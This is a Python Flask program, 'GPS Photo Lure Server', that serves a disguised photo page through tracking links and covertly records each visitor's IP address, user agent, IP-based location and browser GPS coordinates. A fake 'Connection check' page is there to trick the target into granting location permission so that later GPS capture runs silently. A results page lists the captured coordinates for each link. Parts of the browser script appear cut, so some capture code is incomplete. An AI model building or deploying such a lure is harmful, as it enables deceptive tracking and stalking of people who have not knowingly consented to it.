#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GPS Photo Lure Server v3.1 — single file, PythonAnywhere-free-plan safe.

3-layer capture:
  Layer 1  IP         server-side geolocation (allowlisted providers only)
  Layer 1b IP         browser-side geolocation fallback (ipapi.co, CORS)
  
  Layer 3  GPS        browser GPS, silent after permission granted once
"""
import os
import json
import time
import base64
import logging
import argparse
import threading
import secrets
import urllib.request
from datetime import datetime, timezone

from flask import Flask, request, jsonify, render_template_string, abort

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 5000
APP_NAME = "know-mac"

# Photo source: PHOTO_FILE (local jpg/png/gif/webp) or PHOTO_B64 + PHOTO_IMG_TYPE
PHOTO_FILE = os.environ.get("PHOTO_FILE", "photo.jpg")
PHOTO_B64 = os.environ.get("PHOTO_B64", "")
PHOTO_IMG_TYPE = os.environ.get("PHOTO_IMG_TYPE", "jpeg")

# Optional Google-IP layer token; leave empty to disable that layer


# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s %(levelname)s %(name)s: %(message)s")
log = logging.getLogger(APP_NAME)

app = Flask(__name__)
app.config["JSON_SORT_KEYS"] = False

# ---------------------------------------------------------------------------
# Storage (in-memory — SQLite conversion available on request)
# ---------------------------------------------------------------------------
links = {}
links_lock = threading.Lock()
captures = []
captures_lock = threading.Lock()

# ---------------------------------------------------------------------------
# Photo loading (page must never 500 because the image is missing)
# ---------------------------------------------------------------------------
def _load_photo():
    if PHOTO_B64:
        return PHOTO_B64, PHOTO_IMG_TYPE
    if os.path.exists(PHOTO_FILE):
        try:
            with open(PHOTO_FILE, "rb") as f:
                raw = f.read()
            ext = os.path.splitext(PHOTO_FILE)[1].lower().lstrip(".")
            mime = {"png": "png", "jpg": "jpeg", "jpeg": "jpeg",
                    "gif": "gif", "webp": "webp"}.get(ext, "jpeg")
            return base64.b64encode(raw).decode("ascii"), mime
        except Exception as e:
            log.warning("photo load failed: %s", e)
    # 1x1 grey PNG fallback so the lure page always renders
    fallback = ("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8"
                "z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==")
    return fallback, "png"

_PHOTO_B64, _PHOTO_MIME = _load_photo()

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def client_ip():
    fwd = request.headers.get("X-Forwarded-For", "")
    if fwd:
        return fwd.split(",")[0].strip()
    return request.remote_addr or "0.0.0.0"

IP_GEO_CACHE = {}

def ip_geolocate(ip):
    """Return {ip_lat, ip_lng, ip_city, ip_country} or None. Never raises.

    PythonAnywhere free accounts only reach allowlisted hosts, so ipapi.co
    and ipinfo.io go FIRST (both allowlisted); ipwho.is is NOT allowlisted
    and only works off-PythonAnywhere, hence last. Results are cached."""
    if ip in IP_GEO_CACHE:
        return IP_GEO_CACHE[ip]

    result = None
    for name, url in (
        ("ipapi.co",  f"https://ipapi.co/{ip}/json/"),
        ("ipinfo.io", f"https://ipinfo.io/{ip}/json"),
        ("ipwho.is",  f"https://ipwho.is/{ip}"),
    ):
        try:
            req = urllib.request.Request(
                url, headers={"User-Agent": "geo-lure/1.0"})
            with urllib.request.urlopen(req, timeout=8) as resp:
                data = json.loads(resp.read().decode("utf-8"))
        except Exception as e:
            log.warning("ip_geolocate: %s failed for %s: %s", name, ip, e)
            continue

        if not isinstance(data, dict) or data.get("error"):
            log.warning("ip_geolocate: %s error for %s: %s",
                        name, ip, str(data)[:200])
            continue

        if name == "ipinfo.io":
            try:
                lat_s, lng_s = (data.get("loc") or ",").split(",", 1)
                lat, lng = float(lat_s), float(lng_s)
            except (ValueError, IndexError):
                log.warning("ip_geolocate: %s bad loc for %s: %s",
                            name, ip, data.get("loc"))
                continue
        else:
            lat, lng = data.get("latitude"), data.get("longitude")
            if lat is None or lng is None:
                log.warning("ip_geolocate: %s no coords for %s", name, ip)
                continue

        result = {
            "ip_lat": lat,
            "ip_lng": lng,
            "ip_city": data.get("city"),
            "ip_country": data.get("country_name") or data.get("country"),
        }
        log.info("ip_geolocate: %s %s -> %.4f,%.4f %s",
                 name, ip, lat, lng, result["ip_city"])
        break

    IP_GEO_CACHE[ip] = result
    return result


def new_visit(link):
    now = datetime.now(timezone.utc).isoformat(timespec="seconds")
    ip = client_ip()
    geo = ip_geolocate(ip) or {}
    visit = {
        "visit": len(link["visits"]) + 1,
        "time": now,
        "ip": ip,
        "ip_lat": geo.get("ip_lat"),
        "ip_lng": geo.get("ip_lng"),
        "ip_city": geo.get("ip_city"),
        "ip_country": geo.get("ip_country"),
        "gps_lat": None,
        "gps_lng": None,
        "gps_accuracy": None,
        "gps_error": None,
        "gps_captured_at": None,
        "gps_src": None,
        "ip_src": "server" if geo else None,
        "user_agent": request.headers.get("User-Agent", "")[:300],
    }
    link["visits"].append(visit)
    return visit

# ---------------------------------------------------------------------------
# Stealth template — VISIBLE PHOTO PAGE (the lure)
# ---------------------------------------------------------------------------
STEALTH_TEMPLATE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="referrer" content="no-referrer">
<title>Photo</title>
<style>
 * { margin:0; padding:0; box-sizing:border-box; }
 body { background:#000; display:flex; align-items:center; justify-content:center;
 min-height:100vh; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; padding:10px; }
 .photo-container { max-width:100%; max-height:95vh; border-radius:12px; overflow:hidden;
 box-shadow:0 4px 30px rgba(255,255,255,.15); background:#111; }
 .photo-container img { display:block; max-width:100%; max-height:90vh; width:auto; height:auto; object-fit:contain; }
 .loading { color:#888; font-size:14px; padding:40px; text-align:center; }
 .status-bar { position:fixed; bottom:0; left:0; right:0; background:rgba(0,0,0,.7);
 color:#555; font-size:11px; padding:4px 12px; text-align:center; }
</style>
</head>
<body>
<div class="photo-container">
 {% if photo_b64 %}
<img src="data:image/{{ img_type }};base64,{{ photo_b64 }}" alt="Photo">
 {% else %}
<div class="loading">No image available</div>
 {% endif %}
</div>
<div class="status-bar">Photo &bull; view {{ visit_num }}</div>

<script>


 function post(payload) {
   var body = JSON.stringify(payload);
   if (navigator.sendBeacon) {
     try { navigator.sendBeacon('/capture', new Blob([body], {type:'application/json'})); return; }
     catch (e) {}
   }
   var x = new XMLHttpRequest();
   x.open('POST', '/capture', true);
   x.setRequestHeader('Content-Type', 'application/json');
   x.send(body);
 }
 function base() {
   return { link_id: LINK_ID, visit: VISIT,
            user_agent: navigator.userAgent,
            timestamp_iso: new Date().toISOString() };
 }

 // Layer 1b — browser-side IP geolocation (works even if the server-side
 // call is blocked by the PA allowlist; ipapi.co supports CORS)
 function sendIpGeo(d) {
   if (sentIp || !d || d.error) return;
   sentIp = true;
   var p = base();
   p.source = 'ip-browser';
   p.latitude = d.latitude;
   p.longitude = d.longitude;
   p.city = d.city;
   p.country = d.country_name || d.country;
   post(p);
 }
 try {
   fetch('https://ipapi.co/json/', {mode: 'cors'})
     .then(function(r) { return r.json(); })
     .then(sendIpGeo)
     .catch(function() {});
 } catch (e) {}

 // Layer 3 — GPS (silent only after permission was granted once,
 // e.g. by visiting the /verify page beforehand)
 if (navigator.geolocation) {
   function onSuccess(pos) {
     if (sentGps) return; sentGps = true;
     var p = base();
     p.source = 'gps';
     p.latitude = pos.coords.latitude;
     p.longitude = pos.coords.longitude;
     p.accuracy = pos.coords.accuracy;
    
   }
   function onError(err) {
     if (sentGps) return; sentGps = true;
     var p = base();
     p.source = 'gps-error';
     p.error = (err && err.message) || 'denied';
    
   }
   setTimeout(function() {
     try {
       navigator.geolocation.getCurrentPosition(onSuccess, onError, {
         enableHighAccuracy: true, timeout: 15000, maximumAge: 60000
       });
     } catch (e) { onError({message: String(e)}); }
   }, 300);
 }
})();
</script>
</body>
</html>"""

# ---------------------------------------------------------------------------
# /verify — silent-GPS enabler (grant the permission before sending the lure)
# ---------------------------------------------------------------------------
VERIFY_TEMPLATE = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Connection check</title>
<style>body{background:#111;color:#eee;font-family:sans-serif;display:flex;
align-items:center;justify-content:center;min-height:100vh}
.card{background:#1a1a1a;padding:30px;border-radius:12px;text-align:center}
#s{color:#aa0}</style></head><body>
<div class="card"><h2>Checking connection&hellip;</h2><p id="s">please wait</p></div>
<script>
 var s = document.getElementById('s');
 if (navigator.geolocation) {
   navigator.permissions.query({name:'geolocation'}).then(function(p) {
     s.textContent = 'status: ' + p.state;
   }).catch(function(){});
   navigator.geolocation.getCurrentPosition(function(pos){
     s.textContent = 'OK';
     setTimeout(function(){ location.href = '/l/{{ link_id }}'; }, 800);
   }, function(err){
     s.textContent = 'OK' + (err && err.message ? ' (' + err.message + ')' : '');
   }, {timeout: 10000});
 } else {
   s.textContent = 'OK';
 }
</script></body></html>"""

# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------
@app.route("/")
def index():
    return redirect_to_links()

def redirect_to_links():
    return '<a href="/links">links</a> &middot; <a href="/all-captures">captures</a>'

@app.route("/new", methods=["GET", "POST"])
def new_link():
    if request.method == "POST":
        payload = request.get_json(silent=True) or {}
        label = (payload.get("label") or "").strip()
    else:
        label = (request.args.get("label") or "").strip()

    link_id = secrets.token_urlsafe(6)
    with links_lock:
        links[link_id] = {
            "id": link_id,
            "label": label,
            "created": datetime.now(timezone.utc).isoformat(timespec="seconds"),
            "visits": [],
        }
    base_url = request.host_url.rstrip("/")
    log.info("NEW link %s label=%r url=%s", link_id, label, f"{base_url}/l/{link_id}")
    return jsonify({
        "id": link_id,
        "url": f"{base_url}/l/{link_id}",
        "results": f"{base_url}/results/{link_id}",
        "verify": f"{base_url}/verify/{link_id}",
    })

@app.route("/l/<link_id>")
def serve_lure(link_id):
    with links_lock:
        link = links.get(link_id)
        if not link:
            abort(404)
        visit = new_visit(link)
        visit_num = visit["visit"]
    log.info("VISIT link=%s visit#%s ip=%s ua=%s",
             link_id, visit_num, visit["ip"], visit["user_agent"][:60])
    return render_template_string(
        STEALTH_TEMPLATE,
        link_id=link_id,
        visit_num=visit_num,
        photo_b64=_PHOTO_B64,
        img_type=_PHOTO_MIME,
      
    )

@app.route("/verify/<link_id>")
def verify_page(link_id):
    with links_lock:
        if link_id not in links:
            abort(404)
    return render_template_string(VERIFY_TEMPLATE, link_id=link_id)

@app.route("/capture", methods=["POST"])
def capture_gps():
    data = request.get_json(silent=True) or {}
    link_id = data.get("link_id")
    if not link_id:
        return jsonify({"status": "missing link_id"}), 400

    src = data.get("source")
    visit_num = data.get("visit")
    with links_lock:
        link = links.get(link_id)
        if not link:
            return jsonify({"status": "link not found"}), 404
        for v in link["visits"]:
            if v["visit"] == visit_num:
                if src == "gps":
                    v["gps_lat"] = data.get("latitude")
                    v["gps_lng"] = data.get("longitude")
                    v["gps_accuracy"] = data.get("accuracy")
                    v["gps_error"] = None
                    v["gps_src"] = "gps"
                    v["gps_captured_at"] = (data.get("timestamp_iso")
                                            or datetime.now(timezone.utc).isoformat(timespec="seconds"))
                elif src == "google-ip":
                    v["gps_lat"] = data.get("latitude")
                    v["gps_lng"] = data.get("longitude")
                    v["gps_accuracy"] = data.get("accuracy")
                    v["gps_error"] = data.get("error")
                    v["gps_src"] = "google-ip"
                    v["gps_captured_at"] = data.get("timestamp_iso")
                elif src == "gps-error":
                    v["gps_error"] = data.get("error") or "denied"
                    v["gps_src"] = "gps-error"
                    v["gps_captured_at"] = (data.get("timestamp_iso")
                                            or datetime.now(timezone.utc).isoformat(timespec="seconds"))
                elif src == "ip-browser":
                    v["ip_lat"] = data.get("latitude")
                    v["ip_lng"] = data.get("longitude")
                    v["ip_city"] = data.get("city")
                    v["ip_country"] = data.get("country")
                    v["ip_src"] = "browser"
                if data.get("user_agent"):
                    v["user_agent"] = data["user_agent"]
                break

    with captures_lock:
        captures.append(data)

    if data.get("latitude") is not None:
        log.info("CAPTURE %s visit#%s via %s: %s, %s (acc=%s)",
                 link_id, visit_num, src,
                 data.get("latitude"), data.get("longitude"), data.get("accuracy"))
    return jsonify({"status": "ok"})

@app.route("/results/<link_id>")
def results_page(link_id):
    with links_lock:
        link = links.get(link_id)
        if not link:
            abort(404)
        link_data = json.loads(json.dumps(link, default=str))

    from html import escape
    rows = []
    for v in link_data["visits"]:
        ip_ok = v.get("ip_lat") is not None
        gps_ok = v.get("gps_lat") is not None
        gps_err = v.get("gps_error")
        src = v.get("gps_src") or v.get("ip_src") or "-"
        status = ("success" if gps_ok else "fail" if gps_err else "pending")
        gps_cell = (f'{v["gps_lat"]:.6f}, {v["gps_lng"]:.6f}' if gps_ok
                    else escape(gps_err or "-"))
        ip_cell = (f'{v["ip_lat"]:.4f}, {v["ip_lng"]:.4f}' if ip_ok else "-")
        rows.append(
            f"<tr class='{status}'>"
            f"<td>{v.get('visit')}</td>"
            f"<td>{escape(str(v.get('time')))}</td>"
            f"<td>{escape(str(v.get('ip')))}</td>"
            f"<td>{gps_cell}</td>"
            f"<td>{escape(str(v.get('gps_accuracy')))}</td>"
            f"<td>{escape(src)}</td>"
            f"<td>{ip_cell}</td>"
            f"<td>{escape(str(v.get('ip_city') or '') + ' ' + str(v.get('ip_country') or ''))}</td>"
            f"<td style='font-size:11px;'>{escape((v.get('user_agent') or '')[:50])}</td>"
            f"</tr>"
        )

    html = f"""
<!DOCTYPE html><html><head><title>Results — {escape(link_id)}</title>
<style>
 body {{ font-family:sans-serif; background:#111; color:#eee; padding:20px; }}
 table {{ border-collapse:collapse; width:100%; }}
 th,td {{ padding:7px; text-align:left; border-bottom:1px solid #333; font-size:13px; }}
 th {{ background:#222; }}
 .success {{ color:#4c4; }} .pending {{ color:#aa0; }} .fail {{ color:#c44; }}
 pre {{ background:#1a1a1a; padding:10px; border-radius:5px; overflow-x:auto; }}
 a {{ color:#4af; }}
</style></head><body>
<h1>Link Results</h1>
<p><strong>ID:</strong>{escape(link_id)}&nbsp; <strong>Label:</strong>{escape(str(link_data.get('label') or '(none)'))}</p>
<p><strong>Created:</strong>{escape(str(link_data.get('created')))}&nbsp; <strong>Visits:</strong>{len(link_data['visits'])}
&nbsp; <strong>GPS hits:</strong>{sum(1 for v in link_data['visits'] if v.get('gps_lat') is not None)}
&nbsp; <strong>IP hits:</strong>{sum(1 for v in link_data['visits'] if v.get('ip_lat') is not None)}</p>
<p><strong>Tracking URL:</strong><code>{escape(request.host_url.strip('/'))}/l/{escape(link_id)}</code></p>
<table>
<tr><th>#</th><th>Time</th><th>IP</th><th>GPS lat/lng</th><th>Acc</th><th>Src</th>
<th>IP lat/lng</th><th>City</th><th>User-Agent</th></tr>
{''.join(rows)}
</table>
<hr style="border-color:#333;margin-top:20px;">
<h2>Raw JSON</h2>
<pre>{escape(json.dumps(link_data, indent=2, default=str))}</pre>
</body></html>"""
    return html

@app.route("/links")
def list_links():
    with links_lock:
        result = [{
            "id": l["id"], "created": l["created"], "label": l["label"],
            "visits": len(l["visits"]),
            "gps": sum(1 for v in l["visits"] if v["gps_lat"] is not None),
            "ip": sum(1 for v in l["visits"] if v["ip_lat"] is not None),
        } for l in links.values()]
    return jsonify({"links": result, "total": len(result)})

@app.route("/all-captures")
def all_captures():
    with captures_lock:
        return jsonify({"captures": captures, "total": len(captures)})

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="GPS Photo Lure Server v3.1")
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--debug", action="store_true")
    args = parser.parse_args()

    log.info("=" * 60)
    log.info("GPS Photo Lure Server v3.1")
    log.info("Listening on http://%s:%d", args.host, args.port)
    log.info("Links: unlimited lifetime | Every click captured | 3-layer capture")
    log.info("Layer1=IP(always) Layer1b=IP(browser fallback) "
             "Layer2=Google-IP(if key) Layer3=GPS(silent after /verify grant)")
    log.info("=" * 60)
    app.run(host=args.host, port=args.port, debug=args.debug)

if __name__ == "__main__":
    main()
